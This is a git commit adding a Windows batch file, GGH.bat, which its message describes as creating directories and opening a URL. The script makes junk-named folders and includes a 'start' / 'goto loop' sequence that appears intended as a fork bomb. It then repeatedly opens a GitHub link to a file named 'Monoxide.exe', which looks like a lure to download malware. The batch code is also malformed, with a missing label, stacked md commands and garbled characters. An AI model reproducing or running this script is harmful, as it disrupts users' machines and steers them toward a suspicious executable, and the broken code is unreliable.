c29a5658f09d5b25b1b43eb160dd4660fd785f33
yakupozdemir183 187 <yakupozdemir183@gmail.com>
2026-01-02 10:20:05 +0300

    Add GGH.bat for directory creation and URL opening
    Create a batch file that creates multiple directories and opens a GitHub link repeatedly.

---
+++ GGH.bat
@@ -0,0 +1,26 @@
+@echo off
+
+md 1
+md 2
+md 3
+md 4
+md 5 md 6 md 7 md 8
+md 9 md 10
+md ®{®€=™€\✓\$™
+md {$°\=✓$\=$\™
+md ^{$=¢¢{¢§=^§^$°\¢
+loop
+start
+goto loop
+Start https://github.com/yakupozdemir183-source/Monoxide.exe
+start https://github.com/yakupozdemir183-source/Monoxide.exe
+Start https://github.com/yakupozdemir183-source/Monoxide.exe
+start https://github.com/yakupozdemir183-source/Monoxide.exe
+Start https://github.com/yakupozdemir183-source/Monoxide.exe
+start https://github.com/yakupozdemir183-source/Monoxide.exe
+Start https://github.com/yakupozdemir183-source/Monoxide.exe
+start https://github.com/yakupozdemir183-source/Monoxide.exe
+
+Echo ZOOOOoOOrt
+Pause
+exit
